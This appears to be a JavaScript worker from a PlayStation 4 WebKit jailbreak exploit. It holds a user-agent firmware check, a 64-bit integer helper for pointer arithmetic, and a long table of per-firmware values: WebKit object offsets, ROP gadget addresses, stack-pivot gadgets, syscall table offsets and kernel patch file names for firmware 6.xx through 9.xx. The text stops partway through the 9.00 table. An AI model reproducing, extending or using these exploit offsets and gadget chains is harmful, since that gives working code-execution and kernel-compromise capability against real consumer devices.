// worker.js — bundled worker (no importScripts)
//#region Constants
//#region Constants
const logger = {
  seq: 0,
  verbose: false,
  console: undefined,

  info(msg) {
    this.log("[+] " + msg);
  },
  error(msg) {
    this.log("[-] " + msg);
  },
  debug(msg) {
    if (this.verbose) {
      this.log("[*] " + msg);
    }
  },
  log(msg) {
    if (is_worker()) {
      self.postMessage({ type: "log", value: "[" + self.name + "]" + msg });
      return;
    }

    if (this.console === undefined) {
      this.console = document.getElementById("progress");
    }

    try {
      this.console.innerHTML =
        '<span style="color:#cccccc">' + msg + "</span>";
    } catch (e) {}

    this.seq++;
  },
};

const version = {
  console: undefined,
  major: undefined,
  minor: undefined,
  init() {
    const ua = navigator.userAgent;

    const matches = ua.match(/PlayStation\s+(\d+)[/ ](\d+)\.(\d+)/);
    if (matches === null) {
      throw new Error(ua + " not supported !!");
    }

    this.console = parseInt(matches[1], 10);
    this.major = parseInt(matches[2], 10);
    this.minor = parseInt(matches[3], 16);
  },
  toString() {
    return this.major + "." + this.minor.toString(16).padStart(2, "0");
  },
};
//#endregion
//#region Classes
class BInt {
  /** @param  {[number, number]|number|string|BInt|ArrayLike<number>} */
  constructor() {
    let lo = 0;
    let hi = 0;

    switch (arguments.length) {
      case 0:
        break;
      case 1:
        let value = arguments[0];
        switch (typeof value) {
          case "boolean":
            lo = value ? 1 : 0;
            break;
          case "number":
            if (Number.isNaN(value)) {
              throw new TypeError("Number " + value + " is NaN");
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError("Integer " + value + " outside safe 53-bit range");
              }

              lo = value >>> 0;
              hi = Math.floor(value / 0x100000000) >>> 0;
            } else {
              BInt.View.setFloat64(0, value, true);

              lo = BInt.View.getUint32(0, true);
              hi = BInt.View.getUint32(4, true);
            }

            break;
          case "string":
            if (value.startsWith("0x")) {
              value = value.slice(2);
            }

            if (value.length > 0x10) {
              throw new RangeError("String " + value + " is out of range !!");
            }

            value = value.padStart(16, "0");

            for (let i = 0; i < 8; i++) {
              const start = value.length - 2 * (i + 1);
              const end = value.length - 2 * i;
              const b = value.slice(start, end);
              BInt.View.setUint8(i, parseInt(b, 16));
            }

            lo = BInt.View.getUint32(0, true);
            hi = BInt.View.getUint32(4, true);

            break;
          case "object":
            if (value !== null) {
              if (Number.isInteger(value.lo) && Number.isInteger(value.hi)) {
                lo = value.lo;
                hi = value.hi;
                break;
              } else if (ArrayBuffer.isView(value) && value.byteLength === BInt.View.byteLength) {
                new Uint8Array(BInt.View.buffer).set(new Uint8Array(value.buffer, value.byteOffset, value.byteLength));

                lo = BInt.View.getUint32(0, true);
                hi = BInt.View.getUint32(4, true);
                break;
              }
            }

          default:
            throw new TypeError("Unsupported value " + value + " !!");
        }
        break;
      case 2:
        hi = arguments[0];
        lo = arguments[1];

        if (!Number.isInteger(hi)) {
          throw new RangeError("hi value " + hi + " is not an integer !!");
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError("lo value " + lo + " is not an integer !!");
        }

        hi >>>= 0;
        lo >>>= 0;

        break;
      default:
        throw new TypeError("Unsupported input !!");
    }

    this.lo = lo;
    this.hi = hi;
  }

  get i() {
    const hi = this.hi | 0;

    if (hi < -0x200000 || hi > 0x1fffff) {
      throw new RangeError(this + " outside safe 53-bit range");
    }

    return hi * 0x100000000 + this.lo;
  }

  get u() {
    const hi = this.hi;

    if (hi > 0x1fffff) {
      throw new RangeError(this + " outside safe 53-bit range");
    }

    return hi * 0x100000000 + this.lo;
  }

  get d() {
    const hi_word = this.hi >>> 16;
    if (hi_word === 0xffff || hi_word === 0xfffe) {
      throw new RangeError(this + " cannot be represented as double");
    }

    BInt.View.setUint32(0, this.lo, true);
    BInt.View.setUint32(4, this.hi, true);

    return BInt.View.getFloat64(0, true);
  }

  toString() {
    return "0x" + this.hi.toString(16).padStart(8, "0") + this.lo.toString(16).padStart(8, "0");
  }

  [Symbol.toPrimitive](hint) {
    if (hint === "string") {
      return this.toString();
    }

    return this.i;
  }

  getBit(idx) {
    if (idx < 0 || idx > 0x3f) {
      throw new RangeError("Bit " + idx + " is out of range !!");
    }

    return (idx < 0x20 ? this.lo >>> idx : this.hi >>> (idx - 0x20)) & 1;
  }

  setBit(idx, value) {
    if (idx < 0 || idx > 0x3f) {
      throw new RangeError("Bit " + idx + " is out of range !!");
    }

    if (idx < 0x20) {
      this.lo = (value ? this.lo | (1 << idx) : this.lo & ~(1 << idx)) >>> 0;
    } else {
      this.hi = (value ? this.hi | (1 << (idx - 0x20)) : this.hi & ~(1 << (idx - 0x20))) >>> 0;
    }
  }

  divmod(value) {
    value = value instanceof BInt ? value : new BInt(value);

    if (value === 0) {
      throw new Error("Division by zero");
    }

    let r = new BInt();
    const q = new BInt();
    for (let i = 0x3f; i >= 0; i--) {
      r = r.shl(1);

      if (this.getBit(i)) {
        r.setBit(0, true);
      }

      if (r.gte(value)) {
        r = r.sub(value);
        q.setBit(i, true);
      }
    }

    return { q, r };
  }

  cmp(value) {
    value = value instanceof BInt ? value : new BInt(value);
    return this.hi !== value.hi ? (this.hi > value.hi ? 1 : -1) : this.lo !== value.lo ? (this.lo > value.lo ? 1 : -1) : 0;
  }

  gt(value) {
    return this.cmp(value) > 0;
  }

  gte(value) {
    return this.cmp(value) >= 0;
  }

  lt(value) {
    return this.cmp(value) < 0;
  }

  lte(value) {
    return this.cmp(value) <= 0;
  }

  eq(value) {
    value = value instanceof BInt ? value : new BInt(value);
    return this.hi === value.hi && this.lo === value.lo;
  }

  neq(value) {
    value = value instanceof BInt ? value : new BInt(value);
    return this.hi !== value.hi || this.lo !== value.lo;
  }

  add(value) {
    value = value instanceof BInt ? value : new BInt(value);

    const lo = this.lo + value.lo;
    const c = lo > 0xffffffff ? 1 : 0;
    const hi = this.hi + value.hi + c;
    if (hi > 0xffffffff) {
      throw new RangeError("add overflowed !!");
    }

    return new BInt(hi, lo);
  }

  sub(value) {
    value = value instanceof BInt ? value : new BInt(value);

    if (this.lt(value)) {
      throw new RangeError("sub underflowed !!");
    }

    const b = this.lo < value.lo ? 1 : 0;
    const hi = this.hi - value.hi - b;
    const lo = this.lo - value.lo;

    return new BInt(hi, lo);
  }

  mul(value) {
    value = value instanceof BInt ? value : new BInt(value);

    const m00 = Math.imul(this.lo, value.lo);
    const m01 = Math.imul(this.lo, value.hi);
    const m10 = Math.imul(this.hi, value.lo);
    const m11 = Math.imul(this.hi, value.hi);

    const d = m01 + m10;
    const lo = m00 + (d >>> 0);
    const c = lo > 0xffffffff ? 1 : 0;
    const hi = m11 + Math.floor(d / 0x100000000) + c;
    if (hi > 0xffffffff) {
      throw new Error("mul overflowed !!");
    }

    return new BInt(hi, lo);
  }

  div(value) {
    return this.divmod(value).q;
  }

  mod(value) {
    return this.divmod(value).r;
  }

  xor(value) {
    value = value instanceof BInt ? value : new BInt(value);

    const lo = (this.lo ^ value.lo) >>> 0;
    const hi = (this.hi ^ value.hi) >>> 0;

    return new BInt(hi, lo);
  }

  and(value) {
    value = value instanceof BInt ? value : new BInt(value);

    const lo = (this.lo & value.lo) >>> 0;
    const hi = (this.hi & value.hi) >>> 0;

    return new BInt(hi, lo);
  }

  or(value) {
    value = value instanceof BInt ? value : new BInt(value);

    const lo = (this.lo | value.lo) >>> 0;
    const hi = (this.hi | value.hi) >>> 0;

    return new BInt(hi, lo);
  }

  not() {
    const lo = ~this.lo >>> 0;
    const hi = ~this.hi >>> 0;

    return new BInt(hi, lo);
  }

  shl(count) {
    if (count < 0 || count > 0x3f) {
      throw new RangeError("Shift " + count + " bits out of range !!");
    }

    if (count === 0) {
      return new BInt(this);
    }

    const lo = count < 0x20 ? (this.lo << count) >>> 0 : 0;
    const hi = count < 0x20 ? ((this.hi << count) | (this.lo >>> (0x20 - count))) >>> 0 : (this.lo << (count - 0x20)) >>> 0;

    return new BInt(hi, lo);
  }

  shr(count) {
    if (count < 0 || count > 63) {
      throw new RangeError("Shift " + count + " bits out of range !!");
    }

    if (count === 0) {
      return new BInt(this);
    }

    const lo = count < 0x20 ? ((this.lo >>> count) | (this.hi << (0x20 - count))) >>> 0 : this.hi >>> (count - 0x20);
    const hi = count < 0x20 ? this.hi >>> count : 0;

    return new BInt(hi, lo);
  }

  alignUp(alignment) {
    if (alignment <= 0 || (alignment & (alignment - 1)) !== 0) {
      throw new RangeError("alignment must be power of 2");
    }

    const mask = alignment - 1;

    let lo = this.lo + mask;
    let hi = this.hi;

    if (lo > 0xffffffff) {
      lo -= 0x100000000;
      hi++;
    }

    lo &= ~mask;

    return new BInt(hi, lo);
  }

  alignDown(alignment) {
    if (alignment <= 0 || (alignment & (alignment - 1)) !== 0) {
      throw new RangeError("alignment must be power of 2");
    }

    const mask = alignment - 1;

    const lo = this.lo & ~mask;
    const hi = this.hi;

    return new BInt(hi, lo);
  }
}
//#endregion
//#region Extensions
Number.prototype.hex = function (padded = false, maxLength = 16) {
  let str = this.toString(16).toUpperCase();

  if (padded) {
    str = str.padStart(maxLength, "0");
  }

  return "0x" + str;
};

Number.prototype.alignUp = function (alignment) {
  const mask = alignment - 1;
  return (this + mask) & ~mask;
};

Number.prototype.alignDown = function (alignment) {
  const mask = alignment - 1;
  return this & ~mask;
};

DataView.prototype.getBInt = function (byteOffset, littleEndian = false) {
  const lo = this.getUint32(byteOffset, littleEndian);
  const hi = this.getUint32(byteOffset + 4, littleEndian);
  return new BInt(hi, lo);
};

DataView.prototype.setBInt = function (byteOffset, value, littleEndian = false) {
  value = value instanceof BInt ? value : new BInt(value);

  this.setUint32(byteOffset, value.lo, littleEndian);
  this.setUint32(byteOffset + 4, value.hi, littleEndian);
};
//#endregion
//#region Static
BInt.View = new DataView(new ArrayBuffer(8));
//#endregion
//#region Functions
function is_worker() {
  return typeof WorkerGlobalScope !== "undefined" && self instanceof WorkerGlobalScope;
}
//#endregion
const constants_cache = new Map();
const constants_map = {
  6: {
    0: {
      wk_CSSFontFace_sizeof: 0x128,
      wk_CSSFontFace_m_families: 0x10,
      wk_CSSFontFace_m_featureSettings_m_buffer: 0x28,
      wk_CSSFontFace_m_featureSettings_m_size: 0x30,
      wk_CSSFontFace_m_featureSettings_m_capacity: 0x34,
      wk_CSSFontFace_m_clients: 0xe8,
      wk_CSSFontFace_m_wrapper: 0x100,
      wk_CSSFontFace_m_status: 0x120,
      wk_CSSFontFace_m_thread: 0xb0,
      wk_CSSFontFace_m_function: 0xb8,
      wk_CSSFontFace_vtable: 0x223e480,
      wk_FontFace_m_backing: 0x18,
      wk_TypedArray_flags: 0x1c,
      wk_ArrayBuffer_m_contents_m_data: 0x28,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x30,
      wk_JSFunction_m_function: 0x38,
      wk_g_JSArrayBufferPoison: 0x2337a10,
      wk_g_JSFunctionPoison: 0x23379d8,
      wk_g_NativeCodePoison: 0x23379c8,

      store_view_size: 0x128,
      store_view_entry: 0x120,
      marker_storage: 0x50,
      pivot_view_sp: 0x10,

      wk_RET: 0x3c,
      wk_LEAVE_RET: 0x3798b,
      wk_POP_R8_RET: 0x79211,
      wk_POP_R9_RET: 0xcdb41,
      wk_POP_R10_RET: 0xce57d1,
      wk_POP_R11_RET: 0x0, // missing
      wk_POP_R12_RET: 0xd8c49c,
      wk_POP_R13_RET: 0x17187eb,
      wk_POP_R14_RET: 0x756ca,
      wk_POP_R15_RET: 0x24ce6d,
      wk_POP_RAX_RET: 0x75bdf,
      wk_POP_RBP_RET: 0x0b6,
      wk_POP_RBX_RET: 0x77759,
      wk_POP_RCX_RET: 0x348d3,
      wk_POP_RDI_RET: 0x24ce6e,
      wk_POP_RDX_RET: 0x201fd,
      wk_POP_RSI_RET: 0x756cb,
      wk_POP_RSP_RET: 0x75d9a,
      wk_PUSH_RAX_POP_RBP_RET: 0x33304c,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1fb49,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x226720,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x4fa07, // temp
      wk_PUSH_RDI_POP_RSP_RET: 0x108b9c2,
      wk_MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8: 0x1874103,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138104,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a0db3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x184bc,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x599023,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET: 0x15a5580,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x1e0fe16, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1aa05c6,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c3c586,
      wk_expm1_builtin: 0xca2000,
      wk___imp___error: 0x2326aa0,
      wk___imp_strerror: 0x2326bf8,
      wk_pthread_create: 0x31b8,
      k__error: 0x16490,
      c_strerror: 0x42910,

      KPATCH: "600.bin",
      SYSENT_661: 0x1123130,
      JMP_RSI_GADGET: 0x3f0c9,
      EVF_OFFSET: 0x7c8971,
    },
    0x20: {
      wk_POP_R10_RET: 0xce57e1,
      wk_POP_R12_RET: 0xd8c4ac,
      wk_POP_R13_RET: 0x19b7b1a,
      wk_POP_R15_RET: 0x24ce8d,
      wk_POP_RDI_RET: 0x9e67d,
      wk_POP_RDX_RET: 0x2516b2,
      wk_PUSH_RAX_POP_RBP_RET: 0x33306c,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x226740,
      wk_PUSH_RDI_POP_RSP_RET: 0x108b9cb,
      wk_MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8: 0x1873923,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138114,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a0dc3,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x599033,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1d6f985,

      wk_expm1_builtin: 0xca2010,

      KPATCH: "620.bin",
      SYSENT_661: 0x1127130,
      JMP_RSI_GADGET: 0x2be6e,
      EVF_OFFSET: 0x7c8e31,
    },
    0x50: {
      wk_CSSFontFace_sizeof: 0x120,
      wk_CSSFontFace_m_clients: 0xd8,
      wk_CSSFontFace_m_wrapper: 0xe0,
      wk_CSSFontFace_m_status: 0x118,

      pivot_view_sp: 0x18,

      wk_LEAVE_RET: 0x12aae7,
      wk_POP_R8_RET: 0x33212,
      wk_POP_R9_RET: 0x5c2701,
      wk_POP_R10_RET: 0x93e691,
      wk_POP_R11_RET: 0x5d761,
      wk_POP_R12_RET: 0x763180,
      wk_POP_R13_RET: 0x19b6dfa,
      wk_POP_R14_RET: 0x3d0fd,
      wk_POP_R15_RET: 0x251551,
      wk_POP_RAX_RET: 0x33213,
      wk_POP_RBX_RET: 0x5d762,
      wk_POP_RCX_RET: 0x26a5b,
      wk_POP_RDI_RET: 0x251552,
      wk_POP_RDX_RET: 0x3a9092,
      wk_POP_RSI_RET: 0x3d0fe,
      wk_POP_RSP_RET: 0x14fe7,
      wk_PUSH_RAX_POP_RBP_RET: 0x335bbc,
      wk_PUSH_RDX_POP_RSP_RET: 0xbac0b9,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x206d9,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22b7b0,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x50a47, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16dcdce,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138714,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a3ea3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1820c,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x59e6c3,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x21d649e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x21d6e3e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c610ee,

      wk_expm1_builtin: 0xca59e0,
      wk___imp___error: 0x2566888,
      wk___imp_strerror: 0x25669e0,
      wk_pthread_create: 0x30c8,
      k__error: 0x163c0,
      c_strerror: 0x42030,

      KPATCH: "650.bin",
      SYSENT_661: 0x1124bf0,
      JMP_RSI_GADGET: 0x15a50d,
      EVF_OFFSET: 0x7c6019,
    },
    0x51: {
      EVF_OFFSET: 0x7c6099,
    },
    0x70: {
      KPATCH: "670.bin",
      SYSENT_661: 0x1125bf0,
      JMP_RSI_GADGET: 0x9d11d,
      EVF_OFFSET: 0x7c7829,
    },
  },
  7: {
    0: {
      wk_CSSFontFace_sizeof: 0xe8,
      wk_CSSFontFace_m_clients: 0x68,
      wk_CSSFontFace_m_wrapper: 0x80,
      wk_CSSFontFace_m_status: 0x9a,
      wk_CSSFontFace_m_thread: 0xd8,
      wk_CSSFontFace_m_function: 0xe0,
      wk_CSSFontFace_vtable: 0x23927c0,
      wk_ArrayBuffer_m_contents_m_data: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,

      store_view_size: 0x48,
      store_view_entry: 0x40,

      wk_LEAVE_RET: 0xf2c93,
      wk_POP_R8_RET: 0x97d32,
      wk_POP_R9_RET: 0x5c6a81,
      wk_POP_R10_RET: 0x61671,
      wk_POP_R11_RET: 0x5cc31,
      wk_POP_R12_RET: 0xda462c,
      wk_POP_R13_RET: 0x19daaeb,
      wk_POP_R14_RET: 0x3c986,
      wk_POP_R15_RET: 0x24be8c,
      wk_POP_RAX_RET: 0x1fa68,
      wk_POP_RBX_RET: 0x28cfa,
      wk_POP_RCX_RET: 0x26afb,
      wk_POP_RDI_RET: 0x835d,
      wk_POP_RDX_RET: 0x52b23,
      wk_POP_RSI_RET: 0x3c987,
      wk_POP_RSP_RET: 0x78c62,
      wk_PUSH_RAX_POP_RBP_RET: 0x3315ec,
      wk_PUSH_RDX_POP_RSP_RET: 0x1152900,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x203e9,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x229070,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x508c7, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1706728,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xf1ba00,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12cfc43,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17a4c,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x5a20d3,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET: 0x15d3340,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x223e25e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x210bcde,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c88c4a,

      wk_expm1_builtin: 0xcb3950,
      wk___imp___error: 0x2479030,
      wk___imp_strerror: 0x2479180,
      wk_pthread_create: 0x30e8,
      k__error: 0x161f0,
      c_strerror: 0x3aa10,

      KPATCH: "700.bin",
      SYSENT_661: 0x112d250,
      JMP_RSI_GADGET: 0x6b192,
      EVF_OFFSET: 0x7f92cb,
    },
    0x50: {
      wk_RET: 0x32,
      wk_LEAVE_RET: 0x25654b,
      wk_POP_R8_RET: 0x99272,
      wk_POP_R9_RET: 0x3c267b,
      wk_POP_R10_RET: 0x61d51,
      wk_POP_R11_RET: 0xd492bf,
      wk_POP_R12_RET: 0xda945c,
      wk_POP_R13_RET: 0x19ccebb,
      wk_POP_R14_RET: 0x3c826,
      wk_POP_R15_RET: 0x24d2af,
      wk_POP_RAX_RET: 0x3650b,
      wk_POP_RBX_RET: 0x15d5c,
      wk_POP_RCX_RET: 0x2691b,
      wk_POP_RDI_RET: 0x24d2b0,
      wk_POP_RDX_RET: 0x61d52,
      wk_POP_RSI_RET: 0x3c827,
      wk_POP_RSP_RET: 0x5f959,
      wk_PUSH_RAX_POP_RBP_RET: 0x33208c,
      wk_PUSH_RDX_POP_RSP_RET: 0x1155f50,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x5becb,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22af30,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x509d7, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1701b68,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xf1f2f0,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12d1243,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17fdf0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x5a6d7d,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2230a5e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2051e2e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1b047de,

      wk_expm1_builtin: 0xcba120,
      wk___imp___error: 0x246bc90,
      wk___imp_strerror: 0x246bde0,
      k__error: 0x16220,
      c_strerror: 0x391d0,

      KPATCH: "750.bin",
      SYSENT_661: 0x1129f30,
      JMP_RSI_GADGET: 0x1f842,
      EVF_OFFSET: 0x79a92e,
    },
    0x51: {
      EVF_OFFSET: 0x79a96e,
    },
  },
  8: {
    0: {
      wk_LEAVE_RET: 0x291fd7,
      wk_POP_R8_RET: 0x97442,
      wk_POP_R9_RET: 0x6f501f,
      wk_POP_R10_RET: 0x60f51,
      wk_POP_R11_RET: 0xd2a629,
      wk_POP_R12_RET: 0xd8968d,
      wk_POP_R13_RET: 0x16ccff1,
      wk_POP_R14_RET: 0x3bd76,
      wk_POP_R15_RET: 0x2499df,
      wk_POP_RAX_RET: 0x35a1b,
      wk_POP_RBX_RET: 0x1537c,
      wk_POP_RCX_RET: 0x25ecb,
      wk_POP_RDI_RET: 0x1e3f87,
      wk_POP_RDX_RET: 0x60f52,
      wk_POP_RSI_RET: 0x3bd77,
      wk_POP_RSP_RET: 0xbf669,
      wk_PUSH_RAX_POP_RBP_RET: 0x32c6cc,
      wk_PUSH_RDX_POP_RSP_RET: 0x112dab0,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x5b1bb,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x227990,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xefbc30,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x4fe67, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16d0499,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a6763,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17d3c0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x59cbfd,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET: 0x15a1430,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x21f43fe, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x201eec6,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x19d751e,

      wk_expm1_builtin: 0xc9c840,
      wk___imp___error: 0x2419628,
      wk___imp_strerror: 0x24198a0,
      wk_pthread_create: 0x1b38,
      k__error: 0x160c0,
      c_strerror: 0x38ab0,

      KPATCH: "800.bin",
      SYSENT_661: 0x11040c0,
      JMP_RSI_GADGET: 0xe629c,
      EVF_OFFSET: 0x7edcff,
    },
    3: {
      wk_CSSFontFace_vtable: 0x2345b60,
    },
    0x50: {
      wk_LEAVE_RET: 0x1ba53,
      wk_POP_R8_RET: 0x3b4b3,
      wk_POP_R9_RET: 0x10f372f,
      wk_POP_R10_RET: 0xb1a721,
      wk_POP_R11_RET: 0xeaba69,
      wk_POP_R12_RET: 0x4abe58,
      wk_POP_R13_RET: 0x19a0d8b,
      wk_POP_R14_RET: 0x50877,
      wk_POP_R15_RET: 0x91af9,
      wk_POP_RAX_RET: 0x1ac7b,
      wk_POP_RBX_RET: 0xc46d,
      wk_POP_RCX_RET: 0x1ac5f,
      wk_POP_RDI_RET: 0x91afa,
      wk_POP_RDX_RET: 0x282ea2,
      wk_POP_RSI_RET: 0x50878,
      wk_POP_RSP_RET: 0x73c2b,
      wk_PUSH_RAX_POP_RBP_RET: 0xf816c,
      wk_PUSH_RDX_POP_RSP_RET: 0x522d40,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1433b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0xccd50,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0x15d52a8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x45c27, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1712509,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0xe60ab3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x390650,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x44469e,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1c364ce,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1d70b26,

      wk_expm1_builtin: 0xa9ba00,
      k__error: 0x10750,
      c_strerror: 0x38a80,

      KPATCH: "850.bin",
      SYSENT_661: 0x11041b0,
      JMP_RSI_GADGET: 0xc810d,
      EVF_OFFSET: 0x7da91c,
    },
  },
  9: {
    0: {
      wk_CSSFontFace_sizeof: 0xb8,
      wk_CSSFontFace_m_clients: 0x60,
      wk_CSSFontFace_m_wrapper: 0x68,
      wk_CSSFontFace_m_status: 0x82,
      wk_CSSFontFace_m_thread: 0xa8,
      wk_CSSFontFace_m_function: 0xb0,
      wk_CSSFontFace_vtable: 0x2e48f98,
      wk_FontFace_m_backing: 0x28,
      wk_TypedArray_flags: 0x1c,
      wk_ArrayBuffer_m_contents_m_data: 0x10,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
      wk_JSFunction_m_function: 0x28,

      store_view_size: 0x20,
      store_view_entry: 0,
      marker_storage: 0x10,

      wk_LEAVE_RET: 0x8db5b,
      wk_POP_R8_RET: 0x1a7ef1,
      wk_POP_R9_RET: 0x422571,
      wk_POP_R10_RET: 0xe9e1d1,
      wk_POP_R11_RET: 0x620df9,
      wk_POP_R12_RET: 0x85ec71,
      wk_POP_R13_RET: 0x1da461,
      wk_POP_R14_RET: 0x1f4d5,
      wk_POP_R15_RET: 0x31968f,
      wk_POP_RAX_RET: 0x51a12,
      wk_POP_RBX_RET: 0xbe5d0,
      wk_POP_RCX_RET: 0x657b7,
      wk_POP_RDI_RET: 0x319690,
      wk_POP_RDX_RET: 0x986c,
      wk_POP_RSI_RET: 0x1f4d6,
      wk_POP_RBP_RET: 0x685e6e,
      wk_POP_RSP_RET: 0x4e293,
      wk_PUSH_RAX_POP_RBP_RET: 0x16d5ccc,
      wk_PUSH_RDX_POP_RSP_RET: 0x1486dba,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x613b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22be90,
